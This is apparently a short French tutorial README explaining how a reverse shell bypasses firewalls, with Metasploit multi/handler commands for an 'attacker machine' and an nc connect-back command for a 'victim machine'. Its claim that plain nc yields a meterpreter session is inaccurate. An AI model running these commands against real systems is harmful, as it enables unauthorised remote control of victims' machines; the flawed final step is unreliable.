# Reverse shell (shell inversé)

Payload : partie du programme qui s'execute côté client (charge utile)

## Description 
Dans une connection normal, le client (nous) envoie une requête au serveur qui lui
nous renvoie une réponse.

![ez](https://github.com/JohnDoeSensei/ReverseShell/blob/main/reverse1.PNG)


Le problème étant que le pare-feu bloque les connections entrantes.
Pour se faire, nous allons faire en sorte d'etre le serveur et la victime le client.
Notre propre machine va ecouter les connections sur un port et la victime va initié la 
connection avec nous. 

![ez](https://github.com/JohnDoeSensei/ReverseShell/blob/main/reverse2.PNG)

Vu que la victime demandera la connection avec notre serveur,
le pare feu ne bloquera pas une connection sortante (de l'interieur vers l'exterieur)
Une fois les deux devices connectés nous pouvons envoyer des commandes à distances 
et recupérer le resultat via les connections sortantes du payload.

![ez](https://github.com/JohnDoeSensei/ReverseShell/blob/main/reverse3.PNG)


## Server side (attacker machine) 
* <code>msfconsole </code>
* <code> use multi/handler </code>
* <code> set payload windows/meterpreter/reverse_tcp </code>
* <code> set lhost 192.168.1.XX </code> 
* <code> set lport 4444 </code>
* <code> run </code>

Ici nous avons créer un server en ecoute qui attends une connection entrante.
Il nous reste seulement a ce que le payload soit injecté dans la machine de la victime

## Client side  (Victim machine)

<code> nc 192.168.1.XX 4444 </code>

Ici on effectue une demande de connection vers notre server. 
On a créer une session meterpreter.
